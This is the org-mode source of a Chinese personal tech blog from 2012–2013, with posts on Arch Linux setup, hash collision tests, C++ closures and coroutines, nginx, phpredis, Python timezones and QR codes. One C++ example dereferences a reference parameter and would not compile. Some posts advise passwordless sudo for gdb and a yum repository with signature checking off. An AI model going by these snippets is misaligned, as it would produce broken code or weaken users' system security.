#+TITLE: 看看俺 - KanKanAn.com
#+DESCRIPTION: 记我所思，忆我所为。
#+DATE: 2013-04-09 12:00:00
#+LANGUAGE: zh-CN
#+STARTUP: logdone content

#+PUBLISH_DIR: .
#+URL: http://blog.kankanan.com

#+DEFAULT_CATEGORY: Posts
#+DISQUS: kankananblog
#+FILENAME_SANITIZER: ob-sanitize-string
#+POST_SORTER: ob-sort-posts-by-title

#+POST_BUILD_SHELL: cmd 1
#+POST_BUILD_SHELL: cmd 2
#+POST_BUILD_SHELL: cmd 3
#+POST_BUILD_SHELL: cmd 4


* Blog details
** Copyright
  :PROPERTIES:
  :SNIPPET:  t
  :END:

版权所有 © 2011-2013 看看俺 – KanKanAn.com

** About
  :PROPERTIES:
  :SNIPPET:  t
  :END:

记我所思，忆我所为

** Navigation
  :PROPERTIES:
  :SNIPPET:  t
  :END:

- [[file:{lisp}(ob:path-to-root){/lisp}/archives.html][/icon-list icon-white/ {lisp}(ob:gettext :archives){/lisp}]]

- [[file:{lisp}(ob:path-to-root){/lisp}/tags.html][/icon-tags icon-white/ {lisp}(ob:gettext :tags){/lisp}]]

- [[file:{lisp}(ob:path-to-root){/lisp}/index.xml][/icon-rss icon-white/ {lisp}(ob:gettext :rss){/lisp}]]


** Navigation Footer
  :PROPERTIES:
  :SNIPPET:  t
  :END:

  - [[file:{lisp}(ob:path-to-root){/lisp}/index.html][/icon-home icon-white/ {lisp}(ob:gettext :home){/lisp}]]

  - [[file:{lisp}(ob:path-to-root){/lisp}/tags.html][/icon-tags icon-white/ {lisp}(ob:gettext :tags){/lisp}]]

  - [[file:{lisp}(ob:path-to-root){/lisp}/archives.html][/icon-list icon-white/ {lisp}(ob:gettext :archives){/lisp}]]

  - [[file:{lisp}(ob:path-to-root){/lisp}/index.xml][/icon-rss icon-white/ {lisp}(ob:gettext :rss){/lisp}]]

  - [[file:{lisp}(ob:path-to-root){/lisp}/changelog.html][/icon-pencil icon-white/ {lisp}(ob:gettext :changelog){/lisp}]]


** {lisp}(ob:gettext :tags){/lisp}
  :PROPERTIES:
  :PAGE:     tags.html
  :TEMPLATE: blog_post-by-tags.html
  :END:

* Changelog
  :PROPERTIES:
  :PAGE:     changelog.html
  :END:

- 2013-04-09
  - 使用[[http://renard.github.com/o-blog][o-blog]]搭建个人博客.

* Posts
** DONE 使用o-blog搭建个人博客                                       :o@blog:
   CLOSED: [2013-04-09 二 12:30]

   新的博客使用[[http://renard.github.com/o-blog][o-blog]]搭建，使用的是自已的分枝[[https://github.com/tangxinfa/o-blog][tangxinfa-o-blog]]，我的分枝主要是对原系统做了一定的简化以便适用于创建个人博客，另修复了一些bug（主要是中文相关），可使用以下配置安装我的分枝：
   #+begin_src lisp
     (setq el-get-sources '((:name tangxinfa-o-blog
                                       :type git 
                                       :url "https://github.com/tangxinfa/o-blog.git"
                                       :load "o-blog.el"
                                       :features o-blog)))
   #+end_src
   #+begin_src sh
     M-x el-get-install tangxinfa-o-blog
   #+end_src

   具体使用可参考本博客的原始org文件：

   #+begin_src sh
     git clone https://github.com/tangxinfa/tangxinfa.github.com.git
   #+end_src

** DONE Archlinux下安装fcitx输入法                          :archlinux:fcitx:
   CLOSED: [2012-12-15 六 21:56]

*** 安装
    
    #+BEGIN_SRC sh
      sudo yaourt -S fcitx-im
      ln -s /etc/xdg/autostart/fcitx-autostart.desktop  ~/.config/autostart/
    #+END_SRC  

*** 配置

    在配置文件~/.xprofile中添加以下内容：
    #+BEGIN_EXAMPLE
      export GTK_IM_MODULE=fcitx
      export QT_IM_MODULE=fcitx
      export XMODIFIERS="@im=fcitx"
      export LC_CTYPE="zh_CN.UTF-8"
    #+END_EXAMPLE

    因为用的是gnome3桌面，需要禁用ibus：
    #+BEGIN_EXAMPLE
      gsettings set org.gnome.settings-daemon.plugins.keyboard active false
    #+END_EXAMPLE
    还需要在键盘快捷键设置界面中将输入源切换的快捷键清除。
   
** DONE Archlinux下安装cups打印系统                          :archlinux:
   CLOSED: <2013-03-27 三 21:56>

  - 安装 ::
#+BEGIN_SRC sh
yaourt -S cups-pdf
#+END_SRC
  
  - 启动 ::
#+BEGIN_SRC sh
sudo systemctl start cups
#+END_SRC

  - 配置 ::
    参考：https://wiki.archlinux.org/index.php/Cups#PDF_virtual_printer

    登录的用户名要为root，否则后面还是无法添加打印机，web界面没有退出登录的选项，可以试试重启cups服务浏览器清除缓存的数据。

** DONE 网页中的自动完成的下拉列表框                      :web:jquery:chosen:
   CLOSED: <2013-03-10 日 21:23>

*** jqueryui的[[http://jqueryui.com/autocomplete/#combobox][组件]]
    示例效果看起来挻好，不过发现几个问题：

    - 和[[http://twitter.github.com/bootstrap/][bootstrap]]有冲突，导致右边的下拉箭头部分都看不见。
    - 操作过程中有时候显示的值和实际的值不一致，应该是中文输入法按键事件在firefox下未触发引起的显示的界面部分和隐藏的select输入框值不同步。
    - 没有提供设置当前选中项、禁用的功能，要自行对生成的界面元素进行处理。
  
    这个只是jqueryui自动完成输入框的一个定制示例，不是很完善，而jqueryui自带的正式版看起来只是一个输入框。

*** [[https://github.com/harvesthq/chosen][chosen]]
    非常完美，配置很简单，而且界面很漂亮，在github上评分很高。

** DONE CityHash算法冲突率测试                                     :hash:
   CLOSED: <2012-11-24 六 18:21>

*** [[http://code.google.com/p/cityhash/][CityHash]]介绍
    [[http://www.google.com][Google]] 2010年开始开发并开源的字符串哈希算法，主要包含CityHash32()、CityHash64()和CityHash128()，分别对应32位、64位、128位哈希算法。

*** 测试样本数据
    16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。

*** cityhash64测试结果
    没有冲突

*** cityhash32测试结果
    共32246次冲突，冲突率约为千分之二。
    同一哈希值上55次冲突二次，32136次冲突一次。

** DONE C++的函数、闭包与协程                                           :cpp:
    CLOSED: <2013-03-15 五 10:04>
    
*** 实现序号生成器
**** 函数（Function）
     #+begin_src c++
     #include <cassert>
     
     int id_generator(int& base, int step)
     {
         int result = *base;
         *base += step;
         return result;
     }
     
     int main(int argc, char *argv[])
     {
         int odd_base = 1;
         int even_base = 0;    
         assert(id_generator(odd_base, 2) == 1);
         assert(id_generator(odd_base, 2) == 3);
         assert(id_generator(odd_base, 2) == 5);
         assert(id_generator(even_base, 2) == 0);
         assert(id_generator(even_base, 2) == 2);
         assert(id_generator(even_base, 2) == 4);        
         return 0;
     }
     #+end_src

     - 编译 ::
       #+begin_example
       g++ -g add.cpp -o add
       #+end_example

**** 闭包（Closure）
     #+begin_src c++
     #include <cassert>
       
     int main(int argc, char *argv[])
     {
         int base = 1;
         auto id_generator_odd = [=]() mutable { int result = base; base += 2; return result; };
         base = 0;
         auto id_generator_even = [=]() mutable { int result = base; base += 2; return result; };
         assert(id_generator_odd() == 1);
         assert(id_generator_odd() == 3);
         assert(id_generator_odd() == 5);
         assert(id_generator_even() == 0);
         assert(id_generator_even() == 2);
         assert(id_generator_even() == 4);
         assert(base == 0);
         return 0;
     }
     #+end_src

     - 编译 ::
       #+begin_example
       g++ -g closure.cpp -o closure -std=c++0x
       #+end_example

**** 协程（Coroutine）
     #+begin_src c++
     #include <boost/bind.hpp>
     #include <boost/coroutine/all.hpp>
       
     typedef boost::coroutines::coroutine< int(void) > IDGenerator;
       
     void idGenerator(IDGenerator::caller_type& ca, int base, int step)
     {
         do{
             ca(base);
             base += step;
         }while(true);
     }
       
     int main(int argc, char *argv[])
     {
         IDGenerator id_generator_odd(boost::bind(idGenerator, _1, 1, 2));
         IDGenerator id_generator_even(boost::bind(idGenerator, _1, 0, 2));
         assert(id_generator_odd.get() == 1);
         assert(id_generator_odd().get() == 3);
         assert(id_generator_odd().get() == 5);
         assert(id_generator_even.get() == 0);
         assert(id_generator_even().get() == 2);
         assert(id_generator_even().get() == 4);
         return 0;
     }
     #+end_src

     - 编译 ::
       #+begin_example
       g++ -g coroutine.cpp -lboost_context -o coroutine -std=c++0x
       #+end_example

*** 特性比较
**** 函数（Function）
     - 无状态
     - 需要独立定义执行体
     - 调用过程中从头到尾执行体内所有代码
     - 在输入相同的情况下，能够保证输出也相同
     - 没有副作用，多线程安全
     - 要借助外部变量保存状态
     - 调用比较麻烦，需要传入保存状态的参数

**** 闭包（Closure）
     - 有状态，内部直接保存
     - 直接内联定义执行体
     - 调用过程中从头到尾执行体内所有代码
     - 输入相同的情况下，输出可能不同
     - 有副作用，非多线程安全
     - 定义时可以多种方式安全地引用外部变量
     - 调用简单，不需要传入保存状态的参数
       
**** 协程（Coroutine）
     - 有状态，内部直接保存
     - 需要独立定义执行体
     - 调用过程中直接从上次的运行状态继续运行
     - 输入相同的情况下，输出可能不同
     - 严禁多线程访问
     - 调用简单，不需要传入保存状态的参数    

** DONE 在emacs模式行上显示图片的尺寸                                 :emacs:
   CLOSED: <2012-08-03 五 08:55>

   下面的lisp代码用于在emacs模式行上显示图片的尺寸：
   #+BEGIN_SRC lisp
   (add-hook 'image-mode-hook (lambda ()
                             "display image size on mode line."
                             (setq mode-name (format "Image[%s](%s*%s)" 
                                                     image-type 
                                                     (car (image-size (image-get-display-property) t)) 
                                                     (cdr (image-size (image-get-display-property) t))))))
   #+END_SRC

   - 效果如下 ::
   #+begin_example
   [(Image[png](181*415))]
   #+end_example
   
** DONE 在emacs中如何以root权限使用gdb调试程序                        :emacs:
   CLOSED: <2013-03-30 六 14:21>

  - 由于M-x命令中使用sudo输入密码无效，需要配置为允许用户sudo gdb免密码
  #+begin_example
  visudo
  # Allow user to sudo gdb without password
  用户 ALL=NOPASSWD: /usr/bin/gdb
  #+end_example

  - 使用root权限启动gdb
  #+begin_example
  M-x gdb
  sudo gdb <program> <pid> --annotate=3
  #+end_example

** DONE 解决360杀毒报网页HTML.Rce.Gen3恶意程序的问题                    :web:
   CLOSED: <2012-08-01 三 08:55>

*** 问题描述
    测试发现在某些机器上会弹出360杀毒危险警告对话框，导致网页无法打开。

*** 解决方法
    将嵌入的统计js脚本从</html>标签后移到里面去。
    - 修改前
    #+BEGIN_SRC html
    ...
    </body>
    </html>
    <script type="text/javascript">document.write(unescape("%3Cscript%20...%3C/script%3E"));</script>
    #+END_SRC
    - 修改后
    #+BEGIN_SRC html
    ...
    <script type="text/javascript">document.write(unescape("%3Cscript%20...%3C/script%3E"));</script>
    </body>
    </html>
    #+END_SRC

*** 心得
    以后再遇到这种情况，可以采取排除法，将网页另存为本地文件，一点点的删除内容直到360杀毒不再报警为止。

** DONE 解决Archlinux下ati显卡3D硬件加速失效的问题                :archlinux:
   CLOSED: <2012-09-05 三 23:52>

*** 问题描述
    - 症状

      进入gnome3桌面环境后很卡，不动还好，一动gnome-shell进程cpu占用就直奔100%。

    - dmesg异常日志
      #+BEGIN_EXAMPLE
      radeon_cp: Failed to load firmware "radeon/R520_cp.bin"
      radeon 0000:01:00.0: failed initializing CP (-2).
      radeon 0000:01:00.0: Disabling GPU acceleration
      #+END_EXAMPLE
*** 解决办法
#+BEGIN_SRC sh
  sudo ln -s /usr/lib/firmware /lib/
  sudo reboot
#+END_SRC
*** 经验总结
    出现问题时网上不一定能找到你要的答案，像这个问题，网上的论坛里有无数个建议，一个一个试下去其实很浪费时间，
    试几次之后还没能解决就应该尝试主动分析解决，像这里稍微留意到括号里的-2，就能发现其实它是个错误码，
    perror一下就知道意思是“找不到文件或目录”，联想到最近几次升级archlinux在把/lib里的东西往/usr/lib下移，
    其中就包括firemware，这样手工在旧的firmware位置建一个软链接就解决了这个问题。

*** 备注
    这个问题应该是由于之前glibc升级时未全部完成引起的，archlinux现在把/lib改为/usr/lib的软链接了，可以手工进行设置为软链接这一步骤来修复。

** DONE Fnv算法冲突率测试                                          :hash:
   CLOSED: <2012-11-24 六 18:31>

*** [[http://www.isthe.com/chongo/tech/comp/fnv/][Fnv]]介绍
    Fnv是和 [[http://code.google.com/p/cityhash/][CityHash]] 类似的哈希算法。这里重复《[[http://blog.kankanan.com/posts/2012/11/24_cityhash7b976cd551b27a8173876d4b8bd5.html][CityHash算法冲突率测试]]》，做为一个对比。

*** 测试样本数据
    16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。

*** fnv64测试结果
    没有冲突

*** fnv32测试结果
    共31948次冲突，冲突率约为千分之二。
    同一哈希值上33次冲突二次，31879次冲突一次。
    冲突率比CityHash略低，少了298次。

** DONE 如何做面试
   CLOSED: <2012-10-24 三 14:23>

*** 语言基础
*** 相关技术
*** 性能优化
*** 架构
*** 管理
*** 诉求
** DONE 理解nginx的keepalive_timeout配置项                       :nginx:http:
   CLOSED: [2012-11-12 二 17:05]
   
   不要误以为它是指tcp连接空闲多少秒后关闭，它仅表示连接建立多少秒后关闭，不会在一次请求后重新计时。

** DONE 在python中安装mysqldb模块                                    :python:
   CLOSED: <2012-08-01 三 08:55>

*** 正常的安装过程
#+begin_src sh
  wget "http://downloads.sourceforge.net/project/mysql-python/mysql-python\
/1.2.3/MySQL-python-1.2.3.tar.gz?r=http%3A%2F%2Fsourceforge.net%2Fprojects\
%2Fmysql-python%2Ffiles%2F&ts=1304062611&use_mirror=nchc"
  tar xzvf MySQL-python-1.2.3.tar.gz
  cd MySQL-python-1.2.3
  python setup.py build
  python setup.py install
#+end_src

*** 常见错误及其修复
    - ImportError: No module named setuptools
      #+name: install-setuptools
      #+begin_src sh
      wget http://pypi.python.org/packages/2.4/s/setuptools/setuptools-0.6c11-py2.4.egg\
      #md5=bd639f9b0eac4c42497034dec2ec0c2b
      sh setuptools-0.6c11-py2.4.egg
      #+end_src

    - mysql\_config: command not found
      #+name: edit-site.cfg 
      #+begin_src sh
      sed --in-place -e "s/#mysql_config = \/usr\/local\/bin\/mysql_config/\
      mysql_config = \/usr\/local\/mysql\/bin\/mysql_config/g" site.cfg
      #+end_src

    - ImportError: \dots{} \_mysql.so: undefined symbol: compress
      #+name: edit-setup\_posix.py
      #+begin_src sh
      sed --in-place -e "s/libs = mysql_config(\"libs_r\")/libs = mysql_config(\"libs_r\")\n\
      libs.append('-lz')\n        print libs/g" setup_posix.py
      #+end_src

** DONE 如何学习英语                                               :english:
   CLOSED: <2013-04-07 日 09:49>

   经过一天的英孚及韦博试听，总结出以下几点：
   - 语法 ::
     熟读常用句型，扩展至类似语句，从中提炼语法，另一方面也可以练就一口流利的日用口语。
   - 听力 ::
     不会说就不会听，多说才能够快速识别听到的东西。
   - 阅读 ::
     多记单词，不断的重复重复再重复，直到看到单词脱口而出。
   
** DONE MongoDB基础                                                 :mongodb:
   CLOSED: <2012-10-21 日 17:06>
   
*** MongoDB与Mysql的基本结构对应关系
**** 一台机器
     computer

***** 多个MongoDB实例                                          <--对应-->                    mysql服务器进程
      MongoDB Instance                                        <--对应-->                    Mysqld Instance

      运行着的MongoDB后台服务进程：/etc/rc.d/mongodb start      <--对应-->                     /etc/rc.d/mysqld start

****** 多个数据库                                              <--对应-->                    mysql中的数据库
       MongoDB Database                                       <--对应-->                     Database

******* 多个集合                                               <--对应-->                    mysql中的表
        MongoDB Collection                                    <--对应-->                     Table

******** 多个文档                                             <--对应-->                     mysql中的记录行
         MongoDB Document                                     <--对应-->                    Row

*** CentOS上搭建环境
    - 添加源/etc/yum.repos.d/10gen.repo ::
      #+BEGIN_EXAMPLE
      [10gen]
      name=10gen Repository
      baseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64
      gpgcheck=0
      #+END_EXAMPLE
    - 安装服务器客户端程序 ::
      #+BEGIN_SRC sh
      yum install mongo-10gen mongo-10gen-server
      #+END_SRC
    - 安装php扩展 ::
      #+BEGIN_SRC sh
      yum -y install make gcc php-devel
      yum install php-pear
      PATH=$PATH:/usr/local/php/bin/ pecl install mongo
      #+END_SRC
      php.ini中添加：extension=mongo.so
    - 启动服务 ::
      /etc/rc.d/init.d/mongodb start
     
** DONE 解决mysql_connect慢的问题                                     :mysql:
   CLOSED: <2012-12-06 四 10:25>

  压测时发现mysql\_connect耗时超过30秒，登录mysql后执行show processlist，显示超过800个连接状态如下：

  #+BEGIN_EXAMPLE
   unauthenticated user | XXXX.XXX.XXX.XXX:XXXX  | NULL | Connect     |  NULL | login    
  #+END_EXAMPLE

  经求教运维，在my.cnf中的“[mysqld]”下添加以下配置行即可：

  #+BEGIN_EXAMPLE
    skip-name-resolve
  #+END_EXAMPLE

** DONE Nginx Comet: 基于 HTTP 长连接的“服务器推”技术         :nginx:comet:
   CLOSED: <2012-12-14 五 21:09>

*** 简介
    可参考这篇文章：[[http://www.ibm.com/developerworks/cn/web/wa-lo-comet/][Comet：基于 HTTP 长连接的“服务器推”技术]]

*** [[https://github.com/slact/nginx_http_push_module][nginx\_http\_push\_module]] （不建议使用）
  这个模块功能上没有问题，网上介绍的文章相对比较多，但是存在严重的内存泄露问题，而且发现使用kill -HUP的方式优雅重启nginx虽会释放一部分内存，但nginx错误日志显示有共享内存锁相关的冲突，我们不得不每小时彻底重启一次nginx。简单说一下就是它使用一个全局的内存池来分配订阅者及响应需要的内存空间，但是从nginx内存池分配的小内存块（< pagesize，4096）是不会释放的也不会归还到池中进行重用，具体可查看nginx源码的ngx\_palloc和ngx\_pfree函数进行验证。

  可google "nginx中mod\_push模块内存分配改造"，在作者的[[http://http://blog.lifeibo.com/][网站]]正在改版暂时找不到该文章。
  
  [[http://bsd.ee/~hadara/blog/?p=215=1][这里]]也有人[[https://github.com/slact/nginx_http_push_module/pull/60][指出]]该问题，同时该文作者也fork了一个分枝，但是我试了一下，除了不支持push\_channel\_timeout特性外，还是一样有内存泄露。

  - 参考配置 ::
#+BEGIN_EXAMPLE
    location ~ ^/publish$ {
        allow 127.0.0.1;
        deny all;
        set $push_channel_id $arg_id;
        push_publisher;
        push_delete_oldest_received_message on;
        push_message_timeout 5s;
        #push_channel_timeout 60s;
        push_store_messages off;
    }

    location ~ ^/activity$ {
        if ($args ~ "callback=(.+)" ) {
            rewrite ^/activity "/activity_jsonp" last;
        }
        push_subscriber;
        push_subscriber_timeout 60s;
        push_subscriber_concurrency first;
        push_max_channel_subscribers 1;
        set $push_channel_id $arg_id;
        default_type application/json;
    }

    location ~ ^/activity_jsonp$ {
        push_subscriber;
        push_subscriber_timeout 60s;
        push_subscriber_concurrency first;
        push_max_channel_subscribers 1;
        set $push_channel_id $arg_id;
        default_type application/json;
        echo_before_body $arg_callback "(";
        echo_after_body ")";
    }
#+END_EXAMPLE

*** [[https://github.com/wandenberg/nginx-push-stream-module][nginx-push-stream-module]] （建议使用）
  由于 [[https://github.com/slact/nginx_http_push_module][nginx\_http\_push\_module]] 存在内存泄露问题，同时没有人进行正式的修复，我们决定尝试一下[[https://github.com/wandenberg/nginx-push-stream-module][nginx-push-stream-module]]，这个模块功能更强大同时文档更完整，看起来也更活跃。

  - 优点 ::
    + 更成熟
      有内存消耗说明文档，便于决定共享内存容量配置。
      有统计功能。
      可对响应内容进行再处理。
    + 测试中未发现明显的内存泄露
    + 内置支持jsonp
      返回的jsonp是这样的格式callback([text])，可以通过修改ngx\_http\_push\_stream\_module\_utils.h中定义的NGX\_HTTP\_PUSH\_STREAM\_CALLBACK\_INIT\_CHUNK和NGX\_HTTP\_PUSH\_STREAM\_CALLBACK\_END\_CHUNK去除多余的中括号。
  
- 参考配置 ::
#+BEGIN_EXAMPLE
push_stream_store_messages off;
push_stream_max_subscribers_per_channel 1;
push_stream_subscriber_connection_ttl 60s;
push_stream_longpolling_connection_ttl 60s;

server {
    listen 80;
    server_name localhost 127.0.0.1;
    
    ...

    location ~ ^/publish$ {
        allow 127.0.0.1;
        deny all;
        push_stream_publisher admin;
        set $push_stream_channel_id $arg_id;
    }
    
    location ~ ^/activity$ {
        push_stream_subscriber long-polling;
        set $push_stream_channels_path $arg_id;
        push_stream_content_type "application/json";
        push_stream_message_template "~text~";
    }

    ...
}

#+END_EXAMPLE  

** DONE nginx下快速搭建php运行环境                                :nginx:php:
   CLOSED: <2012-08-11 六 21:09>

*** 安装
**** 安装nginx
     yaourt -S nginx
**** 安装php
      yaourt -S php
**** 安装php-fpm
      yaourt -S php-fpm

*** 配置
**** 配置nginx
     - 将nginx.conf中的以下部分：
       #+BEGIN_EXAMPLE
         #location ~ \.php$ {
         ...
         #}
       #+END_EXAMPLE
     - 修改为
       #+BEGIN_EXAMPLE
          location ~ \.php$ {
             root           /usr/share/nginx/html;
             fastcgi_pass   127.0.0.1:9000;
             fastcgi_index  index.php;
             fastcgi_param  SCRIPT_FILENAME  /usr/share/nginx/html$fastcgi_script_name;
             include        fastcgi_params;
          }
       #+END_EXAMPLE
**** 配置php
     在open\_basedir中添加：/usr/share/nginx/html
**** 配置php-fpm.conf
     启用以下listen配置：
     listen = 127.0.0.1:9000

*** 运行
    - 重启nginx
      #+BEGIN_SRC sh
      sudo /etc/rc.d/nginx restart
      #+END_SRC
    - 启动php-fpm
      #+BEGIN_SRC sh
      sudo php-fpm
      #+END_SRC
    - 然后在/usr/share/nginx/html目录中写php脚本即可。

** DONE php中DOMDocument类createElement和createTextNode的区别           :php:
   CLOSED: <2012-09-27 四 19:05>

*** DOMDocument::createElement
    - 原型：DOMElement DOMDocument::createElement ( string $name [, string $value ] )

      创建一个元素，其中第二个参数是可选的，不会对它进行转义。当value中包含特殊字符（如：&）会出错。
   
*** Domdocument::createTextNode
    - 原型：DOMText DOMDocument::createTextNode ( string $content )

      创建一个文本结点，会对其内容进行转义。

*** 典型示例：创建一个文本元素
    #+begin_src php
    $element = $doc->createElement("city");
    $node = $doc->createTextNode("shenzhen");
    $element->appendChild($node);
    $doc->appendChild($element);
    #+end_src
    - 对应的xml文档：
    #+begin_src xml
    <city>shenzhen</city>
    #+end_src
     
** DONE 当php遇上redis                                            :php:redis:
   CLOSED: <2012-12-08 六 13:41>

   在最近的项目中，我们需要在php中访问redis，我们选择了使用[[https://github.com/nicolasff/phpredis][phpredis]]库，下面是遇到的一些问题。

*** redis持久连接不靠谱。

    可以说这是php的通病了，不管是mysql、memcache还是redis，指望由php本身（包含php扩展）来实现持久连接都是行不通的。

    - 为什么这么说呢？ ::
      首先，所谓的持久连接的实现不外乎在进程（php-fpm）内建一个连接池，当php需要连接时，先以ip+port等信息为key在池中查找，找到则直接返回已有连接没有则新建连接。而当一个请求执行结束时，不关闭连接，而是把连接归还到池中。
      
      这样当php需要用到多个redis实例时（分库），因为一个php-fpm进程会持有每个redis实例的一个连接，所以需要“php-fpm进程数“*“redis实例数"个redis连接，而对于每个redis服务器则有“php-fpm进程数“个客户端连接。

      举个例子：一个web应用开了1000个php-fpm进程，有10个redis实例，那么保持的redis连接数就为1000*10也就是10000，每个redis实例有1000个客户端连接。如果前端或redis再扩容所需要的连接就会以乘积方式增加。一个redis实例有php-fpm进程数个连接的情况下表现如何呢，这就要好好测一测了，反正是每连接一线程的mysql是直接堵死了。

*** RedisArray不靠谱。
    RedisArray实现了一致性hash分布式，但是它在初始化的时候就会连接上每个实例，这在web应用中简直是胡闹，它对一致性hash实现得比较完善，结点失效、动态添加结点时重新hash都有处理，在万不得已进行水平扩容时，可能会用得上。

*** 需要自已关闭redis连接。
  Redis的析构函数没有关闭redis连接，这会导致redis网络负载过高，要确保脚本结束时关闭连接，最好是能够封装一下Redis类再使用。

  - 示例封装 ::
#+BEGIN_SRC php
/// 分布式Redis.
class RedisShard {
    /// 构造函数.
    public function __construct($shards) {
        $this->reinit($shards);
    }

    /// 析构函数.
    /// 脚本结束时，phpredis不会自动关闭redis连接，这里添加自动关闭连接支持.
    /// 可以通过手动unset本类对象快速释放资源.
    public function __destruct() {
        if(isset($this->shard)){
            $this->shard['redis']->close();
        }
    }

    /// 重新初始化.
    public function reinit($shards){
        $index = 0;
        $this->shards = array();
        foreach($shards as $shard){
            $this->shards[$index] = explode(':', $shard); //格式：host:port:db
            $this->shards[$index]['index'] = $index;
            ++$index;
        }        
    }
    
    /// 转发方法调用到真正的redis对象.
    public function __call($name, $arguments) {
        $result = call_user_func_array(array($this->redis($arguments[0]), $name), $arguments);
        if($result === false and in_array($name, array('set', 'setex', 'incr'))) {
            trigger_error("redis error: " . $this->shard[0] . ':' . $this->shard[1] . ':' .$this->shard[2] . " $name " . implode(' ', $arguments), E_USER_NOTICE);
        }
        return $result;
    }

    /// 获取1至max间的唯一序号name，达到max后会从1开始.
    /// redis的递增到最大值后会返回错误，本方法实现安全的递增。
    /// 失败返回false，最要确保已用redis()方法连到生成序号的某个redis对象.
    public function id($name, $max) {
        if(isset($this->shard)){
            $id = $this->shard['redis']->incr('_id_' . $name);
            if($id){
                $max = intval($max/count($this->shards));
                if($id % $max == 0){
                    while($this->shard['redis']->decrBy('_id_' . $name, $max) >= $max){
                    }
                    $id = $max;
                }
                else if($id > $max){
                    $id %= $max;
                }
                return ($id - 1)*count($this->shards) + ($this->shard['index'] + 1);
            }
        }
        return false;
    }

    /// 连接并返回key对应的redis对象.
    public function redis($key){
        //TODO: crc32在32位系统下会返回负数，因我们是部署在64位系统上，暂时忽略.
        assert(PHP_INT_SIZE === 8);
        $index = crc32($key) % count($this->shards);
        $shard = $this->shards[$index];
        if(isset($this->shard)){
            //尝试重用已有连接.
            if($this->shard[0] == $shard[0] and $this->shard[1] == $shard[1]){
                if($this->shard[2] != $shard[2]){
                    if(! $this->shard['redis']->select($shard[2])){
                        trigger_error('redis error: select ' . $shard[0] . ':' . $shard[1] . ':' .$shard[2], E_USER_ERROR);
                        return false;
                    }
                    $this->shard[2] = $shard[2];
                }
                return $this->shard['redis'];
            }
            $this->shard['redis']->close();
            unset($this->shard);
        }
        //新建连接.
        $shard['redis'] = new Redis();
        if(! $shard['redis']->connect($shard[0], $shard[1])){
            trigger_error('redis error: connect ' . $shard[0] . ':' . $shard[1], E_USER_ERROR);
            return false;
        }
        $db = intval($shard[2]);
        if($db != 0 and !$shard['redis']->select($db)){
            trigger_error('redis error: select ' . $shard[0] . ':' . $shard[1] . ':' .$shard[2], E_USER_ERROR);
            $shard['redis']->close();
            return false;
        }
        if(ENABLE_DEVELOP){
            trigger_error('redis connect success. ' . $shard[0] . ':' . $shard[1] . ':' . $shard[2], E_USER_NOTICE);
        }        
        $this->shard = $shard;
        return $this->shard['redis'];
    }
}
#+END_SRC

** DONE python中的UTC与本地时区处理                                  :python:
   CLOSED: <2013-03-20 三 17:29>

   在通过sqlalchemy使用sqlite3数据库的过程中，发现日期时间字段默认值为CURRENT\_TIMESTAMP，但是查出的值少了8个小时。很明显是遇到时区问题了。

   mysql的TIMESTAMP字段类型和sqlite3一样使用UTC时间保存，因为在存取时自动进行了本地时间与UTC时间互转，所以不会遇到时区问题。但是sqlite3没有自动进行这一转换，需要在sql中自行转换:
   #+begin_src sql
    select datetime(CURRENT_TIMESTAMP, 'localtime')
   #+end_src

   进一步google后，找到了这篇文章：《[[http://lucumr.pocoo.org/2011/7/15/eppur-si-muove/][Dealing with Timezones in Python]]》，文章大意是python中的datetime库默认不携带时区信息，而加上时区后又与不带时区的datetime对象无法一起工作（如：比较），另外像datetime.datetime.utcnow()返回的utc时间和datetime.datetime.now()返回的本地时间也是不携带时区信息的（tzinfo属性为None），容易引起混淆，因此处理的简单性，内部最好统一使用UTC标准时间，和用户交互时再转换为本地时间。

   下面是互转的算法：
   #+begin_src python
      #/usr/bin/env python
      
      import datetime
      import time
      import sys
      
      if sys.version >= '3.2.':
          localtimezone = datetime.timezone(datetime.timedelta(seconds=-time.timezone), time.tzname[0])
          utctimezone = datetime.timezone.utc
      else:
          from dateutil import tz
          localtimezone = tz.tzlocal()
          utctimezone = tz.gettz('UTC')
      
      def parsedatetime(dt, fmt="%Y-%m-%d %H:%M:%S"):
          """parse local datetime string as utc datetime object"""
          return datetime.datetime.strptime(dt, fmt).replace(tzinfo=localtimezone).astimezone(utctimezone)
      
      def formatdatetime(dt, fmt="%Y-%m-%d %H:%M:%S"):
          """format utc datetime object as local datetime string"""
          return dt.replace(tzinfo=utctimezone).astimezone(localtimezone).strftime(fmt)
      
      if __name__ == '__main__':
          input_local_datetime = '2012-01-02 03:04:05'
          parsed_utc_datetime = parsedatetime(input_local_datetime)
          assert(formatdatetime(parsed_utc_datetime) == input_local_datetime)
   #+end_src

** DONE 二维码研究                                                   :qrcode:
   CLOSED: <2013-03-30 六 11:21>

*** 介绍
    - [[http://www.itsc.org.sg/pdf/synthesis08/Three_QR_Code.pdf][Three\_QR\_Code.pdf]] ::
      RFC式的文档

    - [[http://suflow.iteye.com/blog/1100678][二维码 编码原理简介]] ::
      通俗易懂的编码细节介绍

    - [[http://zh.wikipedia.org/wiki/QR%E7%A2%BC][QR碼 - 维基百科，自由的百科全书]] ::

    - [[http://www.qrstuff.com/blog/2011/11/23/qr-code-minimum-size][QR Code Minimum Size]] 与 [[http://www.qrstuff.com/blog/2011/01/18/what-size-should-a-qr-code-be][What Size Should A Printed QR Code Be?]] ::
      关于可识别性的一些结论，该网站上有大量二维码研究相关的文章
    
*** 二维码开发库
    - [[https://github.com/fukuchi/libqrencode][libqrencode]] ::
      基础的c语言二维码编码库，很多语言基于它开发扩展，不包含生成png图的功能，如需生成png可参考[[https://github.com/bitly/simplehttp/blob/master/qrencode/qrencode.c][这里]]
    - [[https://github.com/jeromeetienne/jquery-qrcode][jquery-qrcode]] ::
      使用javascript直接在客户端生成二维码，中文支持参见[[http://suflow.iteye.com/blog/1687396][JS生成二维码，支持中文字符]]
    - [[http://people.freebsd.org/~vanilla/qrencode-0.3.tar.bz2][php's qrencode extension]] ::
      使用nginx的扩展性能会更好一点，参考后面[[nginx的相关扩展]].
    - [[http://trac.koka-in.org/libdecodeqr][libdecodeqr]] ::
      二维码解码库
      
*** nginx的相关扩展
**** 基本的二维码
     [[https://github.com/dcshi/ngx_http_qrcode_module][ngx\_http\_qrcode\_module]]
    
**** 二维码个性化水印
   nginx\_http\_image\_filter加上[[http://forum.nginx.org/read.php?21,235958][水印补丁]]即可。

